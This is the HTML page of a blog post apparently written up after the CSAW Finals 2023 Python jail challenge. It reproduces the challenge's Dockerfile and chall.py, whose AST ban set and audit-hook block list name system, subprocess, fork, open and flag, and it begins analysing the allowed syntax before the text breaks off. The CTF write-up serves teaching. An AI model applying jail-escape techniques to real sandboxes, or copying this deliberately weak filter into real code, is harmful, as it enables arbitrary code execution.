
  


  






<!doctype html>
<html
  lang="en"
  dir="ltr"
  class="scroll-smooth"
  data-default-appearance="light"
  data-auto-appearance="true"
><head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="theme-color" content="#FFFFFF" />
  
  <title>Python Jail Escape CSAW Finals 2023 &middot; Wachter Space 🚀</title>
    <meta name="title" content="Python Jail Escape CSAW Finals 2023 &middot; Wachter Space 🚀" />
  
  
  
  
  
  <script
    type="text/javascript"
    src="https://wachter-space.de/js/appearance.min.8a082f81b27f3cb2ee528df0b0bdc39787034cf2cc34d4669fbc9977c929023c.js"
    integrity="sha256-iggvgbJ/PLLuUo3wsL3Dl4cDTPLMNNRmn7yZd8kpAjw="
  ></script>
  
  
  
  
  
  
  
  
  <link
    type="text/css"
    rel="stylesheet"
    href="https://wachter-space.de/css/main.bundle.min.0fc2ef930d53c70c53effb01f12118005a26719d9223a1599730c1d26ee3f132.css"
    integrity="sha256-D8Lvkw1TxwxT7/sB8SEYAFomcZ2SI6FZlzDB0m7j8TI="
  />
  
    
    
    
  
  
  
    
    
  
  
  
  
    
    <script
      defer
      type="text/javascript"
      id="script-bundle"
      src="https://wachter-space.de/js/main.bundle.min.0b250a079f6c2f7d0e03d1f0aa1308acb88137e3caebe1268f7478f0c87c5bf8.js"
      integrity="sha256-CyUKB59sL30OA9HwqhMIrLiBN&#43;PK6&#43;Emj3R48Mh8W/g="
      data-copy="Copy"
      data-copied="Copied"
    ></script>
  
  
  <meta
    name="description"
    content="
      
        Python jail escapes have evolved into their own CTF category over the past years.
I recently gave a talk and wrote a blog post for my CTF team, where I give an introduction to the topic and show some classical examples.
I played CSAW CTF finals with team polyflag, overall the CTF was pretty mid with a lot of guessing and an unacceptable required VPN setup, where we had to install some random VPN client on our machines (with sudo curl ... | bash of course) and then had to authenticate with a Google, LinkedIn, Microsoft, or GitHub account.
      
    "
  />
  
  
  
  
    <link rel="canonical" href="https://wachter-space.de/2023/11/12/csaw23-python-jail-escape/" />
  
  
  
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
    <link rel="manifest" href="/site.webmanifest" />
  
  
  
  
  
  
  
  
  <meta property="og:url" content="https://wachter-space.de/2023/11/12/csaw23-python-jail-escape/">
  <meta property="og:site_name" content="Wachter Space :rocket:">
  <meta property="og:title" content="Python Jail Escape CSAW Finals 2023">
  <meta property="og:description" content="Python jail escapes have evolved into their own CTF category over the past years. I recently gave a talk and wrote a blog post for my CTF team, where I give an introduction to the topic and show some classical examples. I played CSAW CTF finals with team polyflag, overall the CTF was pretty mid with a lot of guessing and an unacceptable required VPN setup, where we had to install some random VPN client on our machines (with sudo curl ... | bash of course) and then had to authenticate with a Google, LinkedIn, Microsoft, or GitHub account.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2023-11-12T00:00:00+00:00">
    <meta property="article:modified_time" content="2023-11-12T00:00:00+00:00">
    <meta property="article:tag" content="Security">

  
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Python Jail Escape CSAW Finals 2023">
  <meta name="twitter:description" content="Python jail escapes have evolved into their own CTF category over the past years. I recently gave a talk and wrote a blog post for my CTF team, where I give an introduction to the topic and show some classical examples. I played CSAW CTF finals with team polyflag, overall the CTF was pretty mid with a lot of guessing and an unacceptable required VPN setup, where we had to install some random VPN client on our machines (with sudo curl ... | bash of course) and then had to authenticate with a Google, LinkedIn, Microsoft, or GitHub account.">

  
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@type": "Article",
    "articleSection": "Posts",
    "name": "Python Jail Escape CSAW Finals 2023",
    "headline": "Python Jail Escape CSAW Finals 2023",
    
    "abstract": "\u003cp\u003ePython jail escapes have evolved into their own CTF category over the past years.\nI recently gave a talk and \u003ca href=\u0022https:\/\/kitctf.de\/learning\/python-jails\u0022 target=\u0022_blank\u0022 rel=\u0022noreferrer\u0022\u003ewrote a blog post\u003c\/a\u003e for my CTF team, where I give an introduction to the topic and show some classical examples.\nI played CSAW CTF finals with team polyflag, overall the CTF was pretty mid with a lot of guessing and an unacceptable required VPN setup, where we had to install some random VPN client on our machines (with \u003ccode\u003esudo curl ... | bash\u003c\/code\u003e of course) and then had to authenticate with a Google, LinkedIn, Microsoft, or GitHub account.\u003c\/p\u003e",
    "inLanguage": "en",
    "url" : "https:\/\/wachter-space.de\/2023\/11\/12\/csaw23-python-jail-escape\/",
    "author" : {
      "@type": "Person",
      "name": "Liam"
    },
    "copyrightYear": "2023",
    "dateCreated": "2023-11-12T00:00:00\u002b00:00",
    "datePublished": "2023-11-12T00:00:00\u002b00:00",
    
    "dateModified": "2023-11-12T00:00:00\u002b00:00",
    
    "keywords": ["security"],
    
    "mainEntityOfPage": "true",
    "wordCount": "1147"
  }
  </script>
    
    <script type="application/ld+json">
    {
   "@context": "https://schema.org",
   "@type": "BreadcrumbList",
   "itemListElement": [
     {
       "@type": "ListItem",
       "item": "https://wachter-space.de/",
       "name": "Wachter Space Blog About Security and Automated Methods",
       "position": 1
     },
     {
       "@type": "ListItem",
       "item": "https://wachter-space.de/posts/",
       "name": "Posts",
       "position": 2
     },
     {
       "@type": "ListItem",
       "item": "https://wachter-space.de/categories/CTF/",
       "name": "CTF",
       "position": 3
     },
     {
       "@type": "ListItem",
       "name": "Python Jail Escape Csaw Finals 2023",
       "position": 4
     }
   ]
 }
  </script>

  
  
    <meta name="author" content="Liam" />
  
  
    
      <link href="https://twitter.com/NearBeteigeuze" rel="me" />
    
      <link href="https://www.linkedin.com/in/liam-wachter-716582198/" rel="me" />
    
      <link href="https://mastodon.cloud/@95p" rel="me" />
    
  
  
  







  
  
  
  
  
  


  
  
</head>
<body
    class="m-auto flex h-screen max-w-7xl flex-col bg-neutral px-6 text-lg leading-7 text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32"
  >
    <div id="the-top" class="absolute flex self-center">
      <a
        class="-translate-y-8 rounded-b-lg bg-primary-200 px-3 py-1 text-sm focus:translate-y-0 dark:bg-neutral-600"
        href="#main-content"
        ><span class="pe-2 font-bold text-primary-600 dark:text-primary-400">&darr;</span
        >Skip to main content</a
      >
    </div>
    
    
      <header class="py-6 font-semibold text-neutral-900 dark:text-neutral sm:py-10 print:hidden">
  <nav class="flex items-start justify-between sm:items-center">
    
    <div class="flex flex-row items-center">
      
  <a
    class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
    rel="me"
    href="/"
    >Wachter Space 🚀</a
  >

    </div>
    
    
      <ul class="flex list-none flex-col text-end sm:flex-row">
        
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
              
                <a
                  href="/posts/"
                  title="Posts"
                  
                  ><span
                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                      >Blog</span
                    >
                  </a
                >
              
            </li>
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
              
                <a
                  href="/categories/Talk/"
                  title="Talk"
                  
                  ><span
                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                      >Talks</span
                    >
                  </a
                >
              
            </li>
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
              
                <a
                  href="/categories/"
                  title="Categories"
                  
                  ><span
                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                      >Topics</span
                    >
                  </a
                >
              
            </li>
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
              
                <a
                  href="/tags/"
                  title="Tags"
                  
                  ><span
                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                      >Tags</span
                    >
                  </a
                >
              
            </li>
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
              
                <a
                  href="/about/"
                  title="About"
                  
                  ><span
                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                      >About</span
                    >
                  </a
                >
              
            </li>
          
          
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
              <button id="search-button-m0" title="Search (/)">
                <span
                  class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"
                >
                  <span class="icon relative inline-block px-1 align-text-bottom"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span>
                </span>
              </button>
            </li>
          
        
      </ul>
    
  </nav>
</header>

    
    <div class="relative flex grow flex-col">
      <main id="main-content" class="grow">
        
  <article>
    <header class="max-w-prose">
      
        <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
  
  
    
  
    
  
  <li class="hidden inline">
    <a
      class="dark:underline-neutral-600 decoration-neutral-300 hover:underline"
      href="https://wachter-space.de/"
      >Wachter Space Blog about Security and Automated Methods</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

  
  <li class=" inline">
    <a
      class="dark:underline-neutral-600 decoration-neutral-300 hover:underline"
      href="https://wachter-space.de/posts/"
      >Posts</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

  
  <li class="hidden inline">
    <a
      class="dark:underline-neutral-600 decoration-neutral-300 hover:underline"
      href="https://wachter-space.de/2023/11/12/csaw23-python-jail-escape/"
      >Python Jail Escape CSAW Finals 2023</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

</ol>


      
      <h1 class="mb-8 mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
        Python Jail Escape CSAW Finals 2023
      </h1>
      
        <div class="mb-10 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
          





  
  



  

  
  
    
  

  

  

  

  


  <div class="flex flex-row flex-wrap items-center">
    
    
      <time datetime="2023-11-12 00:00:00 &#43;0000 UTC">12 November 2023</time>
    

    
    
  </div>

  
  


        </div>
      
      
    </header>
    <section class="prose mt-0 flex max-w-full flex-col dark:prose-invert lg:flex-row">
      
      <div class="min-h-0 min-w-0 max-w-prose grow">
        <p>Python jail escapes have evolved into their own CTF category over the past years.
I recently gave a talk and <a href="https://kitctf.de/learning/python-jails" target="_blank" rel="noreferrer">wrote a blog post</a> for my CTF team, where I give an introduction to the topic and show some classical examples.
I played CSAW CTF finals with team polyflag, overall the CTF was pretty mid with a lot of guessing and an unacceptable required VPN setup, where we had to install some random VPN client on our machines (with <code>sudo curl ... | bash</code> of course) and then had to authenticate with a Google, LinkedIn, Microsoft, or GitHub account.</p>
<p>Well, their challenge <em>Python Garbageman</em> also did not go to plan, and I found an unintended solution.
Still, there are a few learnings from the challenge worth writing up.
The challenge provides a <code>Dockerfile</code></p>
<pre tabindex="0"><code>FROM ubuntu:22.04@sha256:2b7412e6465c3c7fc5bb21d3e6f1917c167358449fecac8176c6e496e5c1f05f

RUN apt-get update &amp;&amp; apt-get install -y socat python3

RUN useradd -ms /bin/sh pyjail
WORKDIR /home/pyjail

COPY ./chall.py ./
COPY ./flag.txt /home/pyjail/flag.txt

RUN chown -R root:pyjail /home/pyjail &amp;&amp; \
     chmod 750 /home/pyjail &amp;&amp; \
     chmod 550 /home/pyjail/chall.py &amp;&amp; \
     chown root:pyjail /home/pyjail/flag.txt &amp;&amp; \
     chmod 444 /home/pyjail/flag.txt

EXPOSE 13336

CMD [&#34;socat&#34;, &#34;-T60&#34;, &#34;TCP-LISTEN:13336,reuseaddr,fork,su=pyjail&#34;,&#34;EXEC:/home/pyjail/chall.py 2&gt;&amp;1&#34;]
</code></pre><p>and <code>chall.py</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> ast
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>BANNED <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#def not</span>
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>Import,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>ImportFrom,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>With,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>alias,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>Attribute,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>Constant,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#should be fine?</span>
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>Subscript,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>Assign,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>AnnAssign,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>AugAssign,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>For,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>Try,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>ExceptHandler,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>With,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>withitem,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>FunctionDef,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>Lambda,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>ClassDef,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#prob overkill but should be fine</span>
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>If,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>And,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>comprehension,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>In,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>Await,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>Global,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>Gt,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>ListComp,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>Slice,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>Return,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>List,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>Dict,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>Lt,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>AsyncFunctionDef,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>Eq,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>keyword,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>Mult,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>arguments,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>FormattedValue,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>Not,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>BoolOp,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>Or,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>Compare,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>GtE,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>ImportFrom,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>Tuple,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>NotEq,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>IfExp,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>alias,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>UnaryOp,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>arg,
</span></span><span style="display:flex;"><span>    ast<span style="color:#f92672">.</span>JoinedStr,
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>myExit <span style="color:#f92672">=</span> exit
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">gadget</span>(a,b):
</span></span><span style="display:flex;"><span>    a<span style="color:#f92672">.</span>myExit<span style="color:#f92672">=</span>b
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">hook</span>(event, args):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> hook<span style="color:#f92672">.</span>exec <span style="color:#f92672">and</span> <span style="color:#e6db74">&#39;exec&#39;</span> <span style="color:#f92672">in</span> event:
</span></span><span style="display:flex;"><span>        hook<span style="color:#f92672">.</span>exec <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    strr <span style="color:#f92672">=</span> event <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; &#34;</span><span style="color:#f92672">.</span>join(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>x<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> args)
</span></span><span style="display:flex;"><span>    strr <span style="color:#f92672">=</span> strr<span style="color:#f92672">.</span>lower()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> any(i <span style="color:#f92672">in</span> strr <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> [
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;exec&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;print&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;import&#39;</span>, <span style="color:#75715e">#this is faulty</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;system&#39;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;flag&#39;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;spawn&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;fork&#39;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;open&#39;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;subprocess&#39;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;sys&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;ast&#39;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;os&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;audit&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;hook&#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;compile&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;__new__&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;frame&#39;</span>]):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;BONK audit!&#34;</span>, event <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; &#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; &#34;</span><span style="color:#f92672">.</span>join(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>x<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> args))
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;calling myExit&#39;</span>, type(myExit), myExit)
</span></span><span style="display:flex;"><span>        myExit()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">pass</span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;audit!&#34;</span>, event <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; &#34;</span><span style="color:#f92672">.</span>join(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>x<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> args))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>hook<span style="color:#f92672">.</span>exec <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">banner</span>():
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Hello world! Please input your program here: &#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    out <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#e6db74">&#34;__EOF__&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> out:
</span></span><span style="display:flex;"><span>        code <span style="color:#f92672">+=</span> out <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        out <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> n <span style="color:#f92672">in</span> ast<span style="color:#f92672">.</span>walk(ast<span style="color:#f92672">.</span>parse(code)):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> type(n) <span style="color:#f92672">in</span> BANNED:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;BAD CODE! BONK!: &#34;</span> <span style="color:#f92672">+</span> str(type(n)))
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># exit()</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> code
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>code <span style="color:#f92672">=</span> banner()
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">myexit outside&#39;</span>, id(myExit))
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">builtins outside&#39;</span>, id(__builtins__))
</span></span><span style="display:flex;"><span>code <span style="color:#f92672">=</span> compile(code, <span style="color:#e6db74">&#34;&lt;CSAW23&gt;&#34;</span>, <span style="color:#e6db74">&#34;exec&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># safer </span>
</span></span><span style="display:flex;"><span>sys<span style="color:#f92672">.</span>addaudithook(hook)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exec(code, {<span style="color:#e6db74">&#34;__builtins__&#34;</span>:__builtins__, <span style="color:#e6db74">&#34;gadget&#34;</span>: gadget, <span style="color:#e6db74">&#34;banner&#34;</span>: banner})
</span></span></code></pre></div><p>Let&rsquo;s analyse what is going on here.
It starts with calling <code>banner</code>, which first reads in python code.
Second, it traverses the AST and checks that no <code>BANNED</code> AST node is present.
Next, it installs a listener <code>hook</code> for audit hooks.</p>
<p>Audit hooks are an interesting concept that trigger for any potentially critical operation such as <code>import</code>, <code>open</code>, <code>exec</code>, and many more.
The audit hook events of the CPython implementation are specified in the <a href="https://docs.python.org/3/library/audit_events.html" target="_blank" rel="noreferrer">Audit events table</a>.
Audit hooks (PEP 578) are meant to trigger whereever an event occurs at runtime, no matter how deep in an API and even in native bindings.
While this is a pretty nice API, I would use this as a best effort service that I would not trust to fully work for any edge case or obscure package.</p>
<p>The challenge checks for the occurrence of some critical events.</p>
<p>The code is then <code>exec</code>ed.
Notably, we get all builtins and the functions gadget and banner.
However, my solution didn&rsquo;t even use <code>gadget</code> I could rewrite it to not use banner.</p>
<p>Let&rsquo;s see what we can do, to work around the restrictions.
Taking the set difference of <code>BANNED</code> and the dict of the AST module, we can only use the AST nodes that occur in:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{<span style="color:#e6db74">&#39;unaryop&#39;</span>, <span style="color:#e6db74">&#39;_Unparser&#39;</span>, <span style="color:#e6db74">&#39;RShift&#39;</span>, <span style="color:#e6db74">&#39;_dims_getter&#39;</span>, <span style="color:#e6db74">&#39;Delete&#39;</span>, <span style="color:#e6db74">&#39;dump&#39;</span>, <span style="color:#e6db74">&#39;NodeTransformer&#39;</span>, <span style="color:#e6db74">&#39;loader&#39;</span>, <span style="color:#e6db74">&#39;get_sourcesegment&#39;</span>, <span style="color:#e6db74">&#39;SINGLE_QUOTES&#39;</span>, <span style="color:#e6db74">&#39;Num&#39;</span>, <span style="color:#e6db74">&#39;walk&#39;</span>, <span style="color:#e6db74">&#39;NamedExpr&#39;</span>, <span style="color:#e6db74">&#39;NameConstant&#39;</span>, <span style="color:#e6db74">&#39;MatchOr&#39;</span>, <span style="color:#e6db74">&#39;LtE&#39;</span>, <span style="color:#e6db74">&#39;Del&#39;</span>, <span style="color:#e6db74">&#39;Store&#39;</span>, <span style="color:#e6db74">&#39;Break&#39;</span>, <span style="color:#e6db74">&#39;ExtSlice&#39;</span>, <span style="color:#e6db74">&#39;Ellipsis&#39;</span>, <span style="color:#e6db74">&#39;IntEnum&#39;</span>, <span style="color:#e6db74">&#39;increment_lineno&#39;</span>, <span style="color:#e6db74">&#39;AsyncWith&#39;</span>, <span style="color:#e6db74">&#39;sys&#39;</span>, <span style="color:#e6db74">&#39;stmt&#39;</span>, <span style="color:#e6db74">&#39;file&#39;</span>, <span style="color:#e6db74">&#39;expr&#39;</span>, <span style="color:#e6db74">&#39;Interactive&#39;</span>, <span style="color:#e6db74">&#39;AugLoad&#39;</span>, <span style="color:#e6db74">&#39;Index&#39;</span>, <span style="color:#e6db74">&#39;TryStar&#39;</span>,<span style="color:#e6db74">&#39;Expr&#39;</span>, <span style="color:#e6db74">&#39;Yield&#39;</span>, <span style="color:#e6db74">&#39;match_case&#39;</span>, <span style="color:#e6db74">&#39;contextmanager&#39;</span>, <span style="color:#e6db74">&#39;fix_missing_locations&#39;</span>, <span style="color:#e6db74">&#39;_getter&#39;</span>, <span style="color:#e6db74">&#39;unparse&#39;</span>, <span style="color:#e6db74">&#39;_dims_setter&#39;</span>, <span style="color:#e6db74">&#39;MatchValue&#39;</span>,<span style="color:#e6db74">&#39;FloorDiv&#39;</span>, <span style="color:#e6db74">&#39;PyCF_TYPE_COMMENTS&#39;</span>, <span style="color:#e6db74">&#39;YieldFrom&#39;</span>, <span style="color:#e6db74">&#39;Is&#39;</span>, <span style="color:#e6db74">&#39;Pow&#39;</span>, <span style="color:#e6db74">&#39;literal_eval&#39;</span>, <span style="color:#e6db74">&#39;_new&#39;</span>, <span style="color:#e6db74">&#39;_ALL_QUOTES&#39;</span>, <span style="color:#e6db74">&#39;operator&#39;</span>, <span style="color:#e6db74">&#39;_ABC&#39;</span>, <span style="color:#e6db74">&#39;Match&#39;</span>, <span style="color:#e6db74">&#39;Set&#39;</span>, <span style="color:#e6db74">&#39;cached&#39;</span>, <span style="color:#e6db74">&#39;_const_types_not&#39;</span>, <span style="color:#e6db74">&#39;Bytes&#39;</span>, <span style="color:#e6db74">&#39;FunctionType&#39;</span>, <span style="color:#e6db74">&#39;nullcontext&#39;</span>, <span style="color:#e6db74">&#39;auto&#39;</span>, <span style="color:#e6db74">&#39;IsNot&#39;</span>, <span style="color:#e6db74">&#39;TypeIgnore&#39;</span>, <span style="color:#e6db74">&#39;MatchClass&#39;</span>, <span style="color:#e6db74">&#39;Call&#39;</span>, <span style="color:#e6db74">&#39;get_docstring&#39;</span>, <span 